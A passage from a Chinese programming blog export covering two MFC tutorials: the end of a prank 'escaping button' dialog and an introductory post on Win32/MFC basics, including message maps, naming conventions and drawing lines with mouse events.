在此添加额外的初始化代码</span></span><br><span class="line">m_btn_left.m_pButton = &amp;m_btn_right;</span><br><span class="line">m_btn_right.m_pButton = &amp;m_btn_left;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对话框中的OnMouseMove可以注释掉了</p></blockquote><p>至此效果就完成了。</p><img src="/2022/08/02/escapeButton/004.png" class=""><img src="/2022/08/02/escapeButton/005.png" class=""><p>鼠标移动到其中一个按钮，就会立马hide，然后另一个show。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>重载button类，是因为之前的<code>OnMouseMove</code>是基于对话框的，那么控件和对话框之间其实有一个z轴，不是一个平级的关系，所以在对话框中写鼠标移动，当鼠标进入到控件的时候，这个消息则是控件捕捉到的，跟对话框就没了关系。</p><p>而重载button类之后，我们鼠标移动的消息是发生在button上，自然就跟对话框没啥关系，所以当鼠标要滑动到其中一个按钮的时候就会立刻响应我们消息中的代码隐藏自身，启用另一个。</p><p>也是因为这种特性，所以是点不到这个按钮了。</p><p>即便是给按钮加选中之后弹出消息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CRunningButtonDlg::OnBnClickedBtnRight</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;恭喜你点到了&quot;</span>),_T(<span class="string">&quot;成功!&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为俩按钮效果一样，函数就不多写一个了，在列表里关联的时候让左边的按钮也关联这个函数消息就行了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BEGIN_MESSAGE_MAP</span>(CRunningButtonDlg, CDialogEx)</span><br><span class="line"><span class="built_in">ON_WM_PAINT</span>()</span><br><span class="line"><span class="built_in">ON_WM_QUERYDRAGICON</span>()</span><br><span class="line"><span class="built_in">ON_WM_MOUSEMOVE</span>()</span><br><span class="line"><span class="built_in">ON_BN_CLICKED</span>(IDC_BTN_RIGHT, &amp;CRunningButtonDlg::OnBnClickedBtnRight)</span><br><span class="line"><span class="built_in">ON_BN_CLICKED</span>(IDC_BTN_LEFT, &amp;CRunningButtonDlg::OnBnClickedBtnRight)</span><br><span class="line"><span class="built_in">END_MESSAGE_MAP</span>()</span><br></pre></td></tr></table></figure><p>不过这一步做不做都一样反正点击不到这个按钮，除非你注释掉重载按钮的鼠标移动消息</p><img src="/2022/08/02/escapeButton/006.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MFC基础</title>
      <link href="/2022/07/25/mfc01/"/>
      <url>/2022/07/25/mfc01/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>微软基础类库（英语：Microsoft Foundation Classes，简称MFC）是微软公司提供的一个类库（class libraries），以C++类的形式封装了Windows API，并且包含一个应用程序框架，以减少应用程序开发人员的工作量。其中包含大量Windows句柄封装类和很多Windows的内建控件和组件的封装类。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="MFC为何物"><a href="#MFC为何物" class="headerlink" title="MFC为何物"></a>MFC为何物</h2><p>传统手工业，需要很多人，然后手工去操作，对于厂家而言，人工费高，质量不确定。<br>而改用机器后，只需要投入材料，一天内的效应会大于人工，而且质量比较平均，当然不是所有的传统手工业都能被机器代替，只是部分。</p><p>这也就是普通c&#x2F;c++代码和api的区别，经过多次封装它自然就变得看起来简单，复用性高。</p><p>MFC既然是微软设计的，自然只适合在windows上做应用开发，像xp、win7、win10兼容性肯定没得说，毕竟也是个亲儿子。<br>不过目前的更新迭代之下，MFC的场景也会比较少，后面还有个跨平台的Qt。<br>虽然少，但是老公司的项目没有转型之前，大部分还是需要维护的。<br>可能外包比较多。</p><p>MFC的学习方式</p><ol><li>(1.c++多态、2.windows消息循环、3.msg loop)</li><li>查文档，不会就查，可以用vs的ide在函数上按f1跳转，也可以记网址</li></ol><p>安装：xxxx自己百度，vs的ide模块化其实看得很清楚了，就是吃内存。</p><blockquote><p>vs2022应该是C++ ATL for v143生成工具和c++ MFC for v143生成工具，都是x86和x64。</p></blockquote><p>MFC能做啥</p><ol><li>微软的基础框架</li><li>桌面应用</li><li>上位机</li><li>pc端的监控软件</li><li>修改注册表&#x2F;启动项等</li></ol><hr><h2 id="前身Win32"><a href="#前身Win32" class="headerlink" title="前身Win32"></a>前身Win32</h2><h3 id="1-窗口程序架构"><a href="#1-窗口程序架构" class="headerlink" title="1.窗口程序架构"></a>1.窗口程序架构</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">WinMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//设计窗口外观以及交互响应</span></span><br><span class="line">    <span class="built_in">RegisterClass</span>(...)</span><br><span class="line">    <span class="comment">//生产窗口</span></span><br><span class="line">    <span class="built_in">CreateWinodw</span>(...)</span><br><span class="line">    <span class="comment">//显示窗口</span></span><br><span class="line">    <span class="built_in">ShowWindow</span>(...)</span><br><span class="line">    <span class="comment">//刷新窗口</span></span><br><span class="line">    <span class="built_in">UpdateWindow</span>(...)</span><br><span class="line">    <span class="comment">//消息循环</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">GetMessage</span>(...))&#123;</span><br><span class="line">        <span class="comment">//消息转发</span></span><br><span class="line">        <span class="built_in">TranslateMessage</span>(...);</span><br><span class="line">        <span class="comment">//消息分发</span></span><br><span class="line">        <span class="built_in">DispatchMessage</span>(...);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="2-API和SDK"><a href="#2-API和SDK" class="headerlink" title="2.API和SDK"></a>2.API和SDK</h3><p>api全称(Application Program Interface) 应用程序编程接口<br>sdk全称(Software Development Kit) 也就是软件开发工具包，一般会包括API接口文档、示例文档、帮助文档、使用手册和相关工具。</p><hr><h3 id="3-窗口和句柄"><a href="#3-窗口和句柄" class="headerlink" title="3.窗口和句柄"></a>3.窗口和句柄</h3><p>窗口就是屏幕上的一片特定区域，可能存在等待接收用户的输入，显示程序的输出。可以包含标题栏、菜单栏、工具栏、空间等<br>句柄(handle)(资源的编号、二级指针)，窗口句柄、文件句柄、数据库连接句柄，本质都是指针<br>c++窗口类对象和窗口并不是一回事，二者的关系是c++窗口类内部定义了一个窗口句柄变量，保存了这个c++窗口类对象和相关的窗口句柄。当窗口销毁时，与之对应的c++窗口类对象销毁与否要看生命周期结束没。反之c++窗口类对象销毁时，与之相关的窗口肯定被销毁了。</p><hr><h3 id="4-消息循环"><a href="#4-消息循环" class="headerlink" title="4.消息循环"></a>4.消息循环</h3><img src="/2022/07/25/mfc01/000.png" class=""><p>银行这种，一般都是个人业务比较多。取个号要么机器上操作，要么去柜台。</p><img src="/2022/07/25/mfc01/001.png" class=""><p>对于windows系统而言，这种循环好看懂一些。</p><p>消息循环会引出一个<code>回调函数</code>。<br>就是说当出现特定事件的时候，都会交给回调函数处理。</p><hr><h3 id="5-变量命名约定"><a href="#5-变量命名约定" class="headerlink" title="5.变量命名约定"></a>5.变量命名约定</h3><table><thead><tr><th>前缀</th><th>含义</th><th>前缀</th><th>含义</th></tr></thead><tbody><tr><td>a</td><td>数组array</td><td>b</td><td>布尔值bool</td></tr><tr><td>by</td><td>无符号字符[字节]</td><td>c</td><td>字符[字节]</td></tr><tr><td>cb</td><td>字节计数</td><td>rgb</td><td>保存颜色值的长整型</td></tr><tr><td>cx，cy</td><td>短整型[计算x，y的长度]</td><td>dw</td><td>无符号长整型</td></tr><tr><td>fn</td><td>函数</td><td>h</td><td>句柄</td></tr><tr><td>i</td><td>整型</td><td>m_</td><td>类的数据成员member</td></tr><tr><td>n</td><td>短整型或整型</td><td>np</td><td>近指针</td></tr><tr><td>p</td><td>指针</td><td>l</td><td>长整型</td></tr><tr><td>lp</td><td>长指针</td><td>s</td><td>字符串string</td></tr><tr><td>sz</td><td>以0结尾的字符串</td><td>tm</td><td>正文大小</td></tr><tr><td>w</td><td>无符号整型</td><td>x，y</td><td>无符号整型[表示x，y的坐标]</td></tr></tbody></table><p>反正windows的产品基本都遵循这样的命名规范。</p><hr><h2 id="MFC程序开发流程"><a href="#MFC程序开发流程" class="headerlink" title="MFC程序开发流程"></a>MFC程序开发流程</h2><hr><h3 id="1-基于对话框的程序"><a href="#1-基于对话框的程序" class="headerlink" title="1.基于对话框的程序"></a>1.基于对话框的程序</h3><p>无菜单栏、工具栏，界面很简单，可使用此类型为对话框。</p><img src="/2022/07/25/mfc01/004.png" class=""><p>类似于计算器这种</p><hr><h3 id="2-基于文档-x2F-试图的程序"><a href="#2-基于文档-x2F-试图的程序" class="headerlink" title="2.基于文档&#x2F;试图的程序"></a>2.基于文档&#x2F;试图的程序</h3><p>标准的windows应用界面，包含菜单栏、工具栏、状态栏等。</p><img src="/2022/07/25/mfc01/005.png" class=""><p>最直观的就是vs的ide喽</p><hr><h3 id="3-MFC与win32开发的区别"><a href="#3-MFC与win32开发的区别" class="headerlink" title="3.MFC与win32开发的区别"></a>3.MFC与win32开发的区别</h3><ul><li>定制界面的区别(手写代码和拖放控件)</li><li>响应键鼠操作的区别(窗口处理函数和消息映射机制)</li></ul><p>win32可以开发纯命令行的程序，也就是windows所说的dos，在命令行里面gcc cmake之类的操作。<br>所以涉及到界面的开发自然而然的是选择MFC。</p><hr><h3 id="4-MFC消息映射机制"><a href="#4-MFC消息映射机制" class="headerlink" title="4.MFC消息映射机制"></a>4.MFC消息映射机制</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BEGIN_MESSAGE_MAP</span>(CMFCApplication1Dlg, CDialogEx)</span><br><span class="line"><span class="built_in">ON_WM_SYSCOMMAND</span>()</span><br><span class="line"><span class="built_in">ON_WM_PAINT</span>()</span><br><span class="line"><span class="built_in">ON_WM_QUERYDRAGICON</span>()</span><br><span class="line"><span class="built_in">END_MESSAGE_MAP</span>()</span><br></pre></td></tr></table></figure><p><code>BEGIN_MESSAGE_MAP</code>即为消息映射表<br>如果有特殊需求也可以进行自定义消息。虽然不能说自定义就一定能达到需求。</p><hr><h3 id="5-构建项目"><a href="#5-构建项目" class="headerlink" title="5.构建项目"></a>5.构建项目</h3><p>vs有默认的项目类型可选，是提高效率的首要之选，不是说不可以从空项目起手，而是节约基础配置的时间。</p><img src="/2022/07/25/mfc01/002.png" class=""><img src="/2022/07/25/mfc01/003.png" class=""><img src="/2022/07/25/mfc01/006.png" class=""><p>至于共享dll编译出来的exe体积肯定是比使用静态库的exe要小。</p><img src="/2022/07/25/mfc01/007.png" class=""><p>默认就共享得了。有需要在使用静态。<br>然后此处基于对话框开发，所以文档模板属性没啥可选的。</p><img src="/2022/07/25/mfc01/008.png" class=""><p>用户界面常用的最小化最大化是可以勾上的，标题名呢也可以在此就设置好。</p><img src="/2022/07/25/mfc01/009.png" class=""><p>这些也可以看着来。</p><p>最后的生成的类一般不做修改。也别闲着用中文，每个人的环境不同，编码有异，在你这能跑在别人那就可能乱码了。</p><p>创建完成之后</p><img src="/2022/07/25/mfc01/010.png" class=""><p>其实就能看到大致的模板了。</p><img src="/2022/07/25/mfc01/011.png" class=""><p>跟预览的效果是一样的。这种直接套模板的确省去了不少麻烦。</p><blockquote><p>其中拖动控件的精髓在工具箱里，属性里面直接选消息。</p></blockquote><hr><h2 id="画线"><a href="#画线" class="headerlink" title="画线"></a>画线</h2><ul><li>知识点<ul><li>屏幕坐标和客户端坐标</li><li>设备上下文</li><li>事件</li></ul></li><li>起点和终点<ul><li>如何捕捉这两点，如左键为起点右键为终点</li></ul></li></ul><p>这次选择基于单个文档，其它倒是不用太在意</p><p>在创建完项目后看到很多头文件和源文件的时候，可以通过菜单栏的视图找到类视图</p><img src="/2022/07/25/mfc01/012.png" class=""><p>能够主要看清有哪些类。</p><p>启动项目后可以看到这样一个模板</p><img src="/2022/07/25/mfc01/013.png" class=""><p>要自己一开始就写肯定是不行的，所以这就是项目模板的好处，可以帮你完成很多基础的操作。<br>至于实现部分，可以通过类视图的类名去得到大意。</p><p>至于画线部分，拆分为两个地方，起点就是我们鼠标左键按下确定第一个点，然后随便他怎么拖动到其他地方然后再点击一下，即为线的终点。</p><p>至于这些鼠标按下抬起的消息，可以通过类视图右击打开属性，找到消息，能看到有很多。</p><img src="/2022/07/25/mfc01/014.png" class=""><img src="/2022/07/25/mfc01/015.png" class=""><p>然后选择这俩</p><img src="/2022/07/25/mfc01/016.png" class=""><p>也就是left button up和left button up，按下和松开</p><p>至于形参，可以转到定义查看<br><code>typedef unsigned int        UINT;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CPoint</span> :</span><br><span class="line"><span class="keyword">public</span> tagPOINT</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// Constructors</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// create an uninitialized point</span></span><br><span class="line"><span class="built_in">CPoint</span>() <span class="keyword">throw</span>();</span><br><span class="line"><span class="comment">// create from two integers</span></span><br><span class="line"><span class="built_in">CPoint</span>(</span><br><span class="line">_In_ <span class="type">int</span> initX,</span><br><span class="line">_In_ <span class="type">int</span> initY) <span class="keyword">throw</span>();</span><br><span class="line"><span class="comment">// create from another point</span></span><br><span class="line"><span class="built_in">CPoint</span>(_In_ POINT initPt) <span class="keyword">throw</span>();</span><br><span class="line"><span class="comment">// create from a size</span></span><br><span class="line"><span class="built_in">CPoint</span>(_In_ SIZE initSize) <span class="keyword">throw</span>();</span><br><span class="line"><span class="comment">// create from an LPARAM: x = LOWORD(dw) y = HIWORD(dw)</span></span><br><span class="line"><span class="built_in">CPoint</span>(_In_ LPARAM dwPoint) <span class="keyword">throw</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Operations</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// translate the point</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Offset</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span> xOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span> yOffset)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Offset</span><span class="params">(_In_ POINT point)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Offset</span><span class="params">(_In_ SIZE size)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetPoint</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span> X,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span> Y)</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">BOOL <span class="keyword">operator</span>==(_In_ POINT point) <span class="type">const</span> <span class="built_in">throw</span>();</span><br><span class="line">BOOL <span class="keyword">operator</span>!=(_In_ POINT point) <span class="type">const</span> <span class="built_in">throw</span>();</span><br><span class="line"><span class="type">void</span> <span class="keyword">operator</span>+=(_In_ SIZE size) <span class="built_in">throw</span>();</span><br><span class="line"><span class="type">void</span> <span class="keyword">operator</span>-=(_In_ SIZE size) <span class="built_in">throw</span>();</span><br><span class="line"><span class="type">void</span> <span class="keyword">operator</span>+=(_In_ POINT point) <span class="built_in">throw</span>();</span><br><span class="line"><span class="type">void</span> <span class="keyword">operator</span>-=(_In_ POINT point) <span class="built_in">throw</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Operators returning CPoint values</span></span><br><span class="line">CPoint <span class="keyword">operator</span>+(_In_ SIZE size) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">CPoint <span class="keyword">operator</span>-(_In_ SIZE size) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">CPoint <span class="keyword">operator</span>-() <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">CPoint <span class="keyword">operator</span>+(_In_ POINT point) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Operators returning CSize values</span></span><br><span class="line">CSize <span class="keyword">operator</span>-(_In_ POINT point) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Operators returning CRect values</span></span><br><span class="line">CRect <span class="keyword">operator</span>+(_In_ <span class="type">const</span> RECT* lpRect) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">CRect <span class="keyword">operator</span>-(_In_ <span class="type">const</span> RECT* lpRect) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一个是改了名的类型，一个则是类。</p><p>这个类中有两个字眼比较醒目，x和y。变相的能猜到肯定是记录了xy轴的坐标。<br>但是按住和松开肯定是会改变xy的，就需要自己定义两个变量去记录起始位置。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">CPoint m_start;<span class="comment">//起始位置，用于绘制线条</span></span><br><span class="line">CPoint m_stop;<span class="comment">//终止位置，用于绘制线条</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonDown</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_start = point;</span><br><span class="line">    CView::<span class="built_in">OnLButtonDown</span>(nFlags, point);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonUp</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_stop = point;</span><br><span class="line">CView::<span class="built_in">OnLButtonUp</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这打两个断点然后跑程序，随便点击一下，就能看到point的xy出现值了</p><img src="/2022/07/25/mfc01/017.png" class=""><p>然而坐标其实也有分别，像屏幕传统的都是1920*1080，说的就是x轴长1920，y轴长1080，而且比较有意思的是这个0，0坐标在屏幕的左上角。<br>屏幕坐标可称为screen point，而程序的坐标可称为client point。</p><p>有了这两个的区别，就可能导致获取到的xy坐标是有问题的。<br>除了基础的xy获取了之后，还要考虑这个信息会不会被其它消息所引用，有引用又得防着被修改了。</p><p>xy有了，那么要考虑绘制的问题。<br>要用到一个类<code>CDC</code><br>这里就不展示了，这个类的定义里面东西有点多。</p><p><code>// The device context</code>在注释中说明，这是一个设备的上下文<br>上下文：在画图中要绘制一些东西的时候，肯定会用到线条的粗细，线条的颜色，画图的大小，画图的大小状态比如最小化最大化和普通状态等许多参数信息，只有了解了所有的参数信息才能绘制出想要的东西。<br>为什么叫设备上下文：上述举例的上下文是属于窗口的上下文，而有其他的情况，你会把绘制的东西显示在显示器上，而不是单独的窗口。那么这种时候就需要获取到你这个屏幕的参数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonUp</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_stop = point;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取设备上下文</span></span><br><span class="line">CDC *pDC = <span class="built_in">GetDC</span>();</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnLButtonUp</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在c++中结构体和类基本功能相通，区别在于类有私有成员。所以传递类并没有太大关系。<br><code>pDC-&gt;MoveTo(m_start);</code><br>moveto 就是说移动到我们的这个点上。然后才可以进行绘制线条之类的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonUp</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_stop = point;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取设备上下文</span></span><br><span class="line">CDC *pDC = <span class="built_in">GetDC</span>();</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line"><span class="built_in">ReleaseDC</span>(pDC);</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnLButtonUp</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pDC-&gt;LineTo(m_stop);</code>line就是线呗，从按下鼠标左键的点到松开的点直接绘制一条直线。<br>并且要记住<code>ReleaseDC(pDC);</code>，避免占用导致程序异常。</p><p>然后就可以run了</p><img src="/2022/07/25/mfc01/018.png" class=""><p>鼠标左键按下直到某个点松开即可绘制出线条。</p><p>多画几条也没事，不过有点踩坑点：就是重绘的问题，此处就是当最大化和最小化的时候线条就莫得了。</p><p>除此之外，每次都需要滑动才能绘制，可能有点low。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">CPoint m_start;<span class="comment">//起始位置，用于绘制线条</span></span><br><span class="line">CPoint m_stop;<span class="comment">//终止位置，用于绘制线条</span></span><br><span class="line">BOOL m_status;<span class="comment">//绘制状态</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonDown</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_start = point;</span><br><span class="line">m_status = TRUE;</span><br><span class="line">    CView::<span class="built_in">OnLButtonDown</span>(nFlags, point);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnLButtonUp</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">m_stop = point;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取设备上下文</span></span><br><span class="line">CDC *pDC = <span class="built_in">GetDC</span>();</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line"><span class="built_in">ReleaseDC</span>(pDC);</span><br><span class="line">m_status = FALSE;</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnLButtonUp</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后新增消息，鼠标移动时。快捷操作就是类视图然后属性里面找到消息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCPaintView::OnMouseMove</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="keyword">if</span> (m_status)&#123;</span><br><span class="line"><span class="built_in">InvalidateRect</span>(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果鼠标正在移动就进行操作</span></span><br><span class="line">CDC *pDC = <span class="built_in">GetDC</span>();</span><br><span class="line">pDC-&gt;<span class="built_in">MoveTo</span>(m_start);</span><br><span class="line">pDC-&gt;<span class="built_in">LineTo</span>(m_stop);</span><br><span class="line"><span class="built_in">ReleaseDC</span>(pDC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CView::<span class="built_in">OnMouseMove</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加一个状态是为了考虑程序刚启动的时候鼠标可能就在绘制区域了，那么有可能m_start没能获取到值，那么后面的绘制就会出现一些问题。</p><p><strong>注：状态肯定要在构造函数里面初始化</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CMFCPaintView::<span class="built_in">CMFCPaintView</span>() <span class="keyword">noexcept</span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此处添加构造代码</span></span><br><span class="line">m_status = FALSE;</span><br><span 